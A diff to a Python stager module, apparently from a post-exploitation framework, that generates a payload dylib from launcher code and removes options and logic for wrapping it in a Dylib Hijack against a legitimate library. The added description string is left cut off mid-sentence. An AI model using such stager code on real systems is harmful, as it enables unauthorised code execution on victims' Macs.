@@ -42,20 +42,10 @@ class Stager:
                 'Value'         :   'True'
             },
             'Hijacker' : {
-                'Description'   :   'Generate dylib to be used in a Dylib Hijack',
+                'Description'   :   'Generate dylib to be used in a Dylib Hijack. This provides a dylib with ',
                 'Required'      :   True,
                 'Value'         :   'False'
-            },
-            'RPath' : {
-                'Description'   :   'Full path of the legitimate dylib as it would be on a target system.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'LocalLegitDylib' : {
-                'Description'   :   'Local path to the legitimate dylib used in the vulnerable application. Required if Hijacker is set to True.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
+            },          
             'OutFile' : {
                 'Description'   :   'File to write the dylib.',
                 'Required'      :   True,
@@ -86,8 +76,6 @@ class Stager:
         arch = self.options['Architecture']['Value']
         hijacker = self.options['Hijacker']['Value']
         safeChecks = self.options['SafeChecks']['Value']
-        legitDylib = self.options['LocalLegitDylib']['Value']
-        rpath = self.options['RPath']['Value']
 
         if arch == "":
             print helpers.color("[!] Please select a valid architecture")
@@ -103,13 +91,5 @@ class Stager:
         else:
             launcher = launcher.strip('echo').strip(' | python &').strip("\"")
             dylib = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker=hijacker)
-            if hijacker.lower() == 'true' and os.path.exists(legitDylib):
-                f = open('/tmp/tmp.dylib', 'wb')
-                f.write(dylib)
-                f.close()
-
-                dylib = self.mainMenu.stagers.generate_dylibHijacker(attackerDylib="/tmp/tmp.dylib", targetDylib=legitDylib, LegitDylibLocation=rpath)
-                os.remove('/tmp/tmp.dylib')
-
             return dylib
 
